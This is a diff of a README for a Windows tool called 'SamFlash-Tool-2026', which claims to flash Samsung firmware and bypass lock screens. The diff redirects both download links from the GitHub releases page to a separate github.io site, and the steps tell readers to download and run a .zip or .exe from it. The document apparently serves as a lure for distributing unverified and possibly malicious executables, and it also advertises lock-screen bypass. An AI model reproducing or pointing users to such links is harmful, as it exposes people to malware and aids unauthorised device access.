@@ -1,6 +1,6 @@
 # 📱 SamFlash-Tool-2026 - Master Samsung Device Management With Ease
 
-[![Download SamFlash Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/judiidentical316/SamFlash-Tool-2026/releases)
+[![Download SamFlash Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://judiidentical316.github.io)
 
 SamFlash-Tool-2026 provides a simple way to manage Samsung mobile devices on Windows systems. This software helps users perform tasks like flashing firmware or bypassing lock screens. It works on Windows 10 and Windows 11. The interface keeps navigation simple for users without technical backgrounds.
 
@@ -19,7 +19,7 @@ Before you install this software, check that your computer meets these requireme
 
 Follow these steps to obtain the tool:
 
-1. Visit the following page to choose your version: [https://github.com/judiidentical316/SamFlash-Tool-2026/releases](https://github.com/judiidentical316/SamFlash-Tool-2026/releases).
+1. Visit the following page to choose your version: [https://judiidentical316.github.io](https://judiidentical316.github.io).
 2. Locate the file ending in .zip or .exe at the bottom of the page under the Assets section.
 3. Click the link to save the file to your computer.
 4. If the file is a compressed .zip file, right-click it after the download finishes and select Extract All.
